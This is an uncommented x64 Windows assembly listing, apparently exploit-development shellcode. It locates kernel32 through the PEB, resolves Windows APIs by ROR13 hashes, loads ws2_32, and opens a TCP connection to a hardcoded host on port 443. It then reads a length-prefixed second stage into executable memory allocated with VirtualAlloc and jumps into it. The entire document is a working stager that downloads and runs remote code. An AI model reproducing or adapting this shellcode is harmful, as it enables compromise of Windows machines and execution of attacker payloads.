start:
    mov rbp, rsp
    sub rsp, 1600

resolve_kernel32:
    mov dl, 0x4b
    mov rcx, 0x60
    mov r8, gs:[rcx]
    mov rdi, [r8 + 0x18]
    mov rdi, [rdi + 0x30]
search:
    xor rcx, rcx
    mov rbx, [rdi + 0x10]
    mov rsi, [rdi + 0x40]
    mov rdi, [rdi]
    cmp [rsi + 0x18], cx
    jne search
    cmp [rsi], dl
    jne search

find_function_jmp:
    jmp callback

get_find_function_addr:                         
    pop rsi
    mov [rbp + 0x8], rsi
    jmp resolve_k32_sym

callback:
    call get_find_function_addr
                
find_function:         
    add rsp, 8
    pop rax
    push -1
    add rsp, rax

find_function_loop2:
    xor rax, rax
    xor rdi, rdi
    mov eax, [rbx + 0x3c]
    mov edi, [rbx + rax + 0x88]
    add rdi, rbx
    mov ecx, [rdi + 24]
    mov eax, [rdi + 32]
    add rax, rbx
    mov [rbp - 8], rax

find_function_loop:
    dec ecx
    mov rax, [rbp - 8]
    mov esi, [rax + rcx * 4]
    add rsi, rbx

compute_hash:
    xor rax, rax
    cdq

compute_hash_repeat:
    ror edx, 0xd
    add edx, eax
    lodsb
    test al, al
    jnz compute_hash_repeat

find_function_compare:                          
    cmp edx, [rsp - 8]
    jnz find_function_loop
    mov edx, [rdi + 36]
    add rdx, rbx
    mov cx, [rdx + 2 * rcx]
    mov edx, [rdi + 28]
    add rdx, rbx
    mov eax, [rdx + 4 * rcx]
    add rax, rbx
    push rax
    mov rax, [rsp - 8]
    cmp rax, -1
    jnz find_function_loop2

find_function_finish:
    sub rsp, 16
    ret

resolve_k32_sym:
    mov rax, 0x00000000ec0e4e8e
    push rax
    mov rax, 0x0000000091afca54
    push rax
    mov rax, 0x00000000ca2bd06b
    push rax
    mov rax, 0x0000000078b5b983
    push rax
    mov rax, 40
    push rax
    call [rbp + 8]

load_ws2_32:
    mov rax, 0x0000000000006C6C
    push rax
    mov rax, 0x642E32335F327377
    push rax
    mov rcx, rsp
    sub rsp, 40
    call [rsp + 88]
    nop

resolve_ws2_sym:
    mov rbx, rax
    mov rax, 0x0000000060aaf9ec
    push rax
    mov rax, 0x00000000adf509d9
    push rax
    mov rax, 0x000000003bfcedcb
    push rax
    mov rax, 0x00000000e71819b6
    push rax
    mov rax, 40
    push rax
    call [rbp + 8]

    sub rsp, 512

call_WSAStartup:
    mov rcx, 0x202
    lea rdx, [rsp + 800]
    call [rsp + 528]

call_WSASocketA:
    mov rcx, 2
    mov rdx, 1
    mov r8, 6
    xor r9, r9
    mov [rsp + 32], r9
    mov [rsp + 40], r9
    call [rsp + 536]

call_connect:
    mov rsi, rax
    mov rcx, rax
    mov r8, 16

    mov r9, 0x9d2da8c0bb010002
    lea rdx, [rsp + 800]
    mov [rdx], r9                       
    xor r9, r9
    mov [rdx + 8], r9                   
    call [rsp + 544]

read_size:
    mov rcx, rsi
    lea rdx, [rsp + 800]
    mov r8, 4
    xor r9, r9
    call [rsp + 520]
    
    test eax, eax
    jle call_TerminateProcess

    mov eax, [rsp + 800]
    mov ebx, eax
    
allocate_stage:
    xor rcx, rcx
    mov rdx, rax
    mov r8, 0x3000
    mov r9, 0x40
    call [rsp + 632]
    
    test rax, rax
    jz call_TerminateProcess
    mov rdi, rax
    mov r12, rax

read_stage_loop:
    test ebx, ebx
    jz execute_stage

    mov rcx, rsi
    mov rdx, rdi
    mov r8, rbx
    xor r9, r9
    
    call [rsp + 520]
    
    test eax, eax
    jle call_TerminateProcess
    
    add rdi, rax
    sub ebx, eax
    jmp read_stage_loop

execute_stage:
    mov rdi, rsi
    mov rcx, rsi
    jmp r12

call_TerminateProcess:
    xor rcx, rcx
    dec rcx
    xor rdx, rdx
    call [rsp + 616]